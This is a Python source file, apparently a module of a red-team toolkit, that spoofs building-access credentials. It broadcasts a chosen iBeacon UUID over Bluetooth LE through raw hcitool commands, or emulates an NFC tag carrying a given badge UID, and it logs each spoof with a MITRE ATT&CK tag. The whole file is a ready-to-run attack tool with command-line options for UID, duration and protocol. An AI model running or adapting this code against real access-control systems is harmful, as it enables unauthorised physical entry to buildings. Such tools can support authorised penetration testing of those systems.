#!/usr/bin/env python3
# modules/attacks/building_access_beacon_faker.py

import argparse
import subprocess
import time
import json
import os
from datetime import datetime

LOG_FILE = "results/beacon_spoof_log.json"
MITRE_TTP = "T1557.001"

def log_beacon(uid, protocol, duration):
    os.makedirs("results", exist_ok=True)
    entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "uid": uid,
        "protocol": protocol,
        "duration_sec": duration,
        "ttp": MITRE_TTP
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")

def spoof_ble(uid, duration):
    print(f"[+] Spoofing BLE beacon UID: {uid}")
    cmd = [
        "hcitool", "cmd", "0x08", "0x0008",  # HCI_LE_Set_Advertising_Data
        "1E", "02", "01", "1A", "1A", "FF", "4C", "00", "02", "15",  # iBeacon prefix
        *[uid[i:i+2] for i in range(0, len(uid), 2)],  # UUID bytes
        "00", "00", "00", "00", "C5"  # Minor/Major/Power
    ]
    subprocess.call(cmd)
    time.sleep(duration)
    subprocess.call(["hcitool", "noleadv"])
    log_beacon(uid, "BLE", duration)

def spoof_nfc(uid, duration):
    print(f"[+] Spoofing NFC UID: {uid}")
    try:
        subprocess.run(["nfc-emulate-forum-tag4", "--uid", uid], timeout=duration)
        log_beacon(uid, "NFC", duration)
    except subprocess.TimeoutExpired:
        print("[✓] NFC spoof duration complete")
    except Exception as e:
        print(f"[!] NFC spoofing failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Spoof building access beacons over BLE or NFC")
    parser.add_argument("--uid", required=True, help="Beacon or badge UID (hex format)")
    parser.add_argument("--duration", type=int, default=10, help="Duration of spoof (seconds)")
    parser.add_argument("--proto", choices=["ble", "nfc"], default="ble", help="Protocol to spoof")

    args = parser.parse_args()

    if args.proto == "ble":
        spoof_ble(args.uid, args.duration)
    else:
        spoof_nfc(args.uid, args.duration)
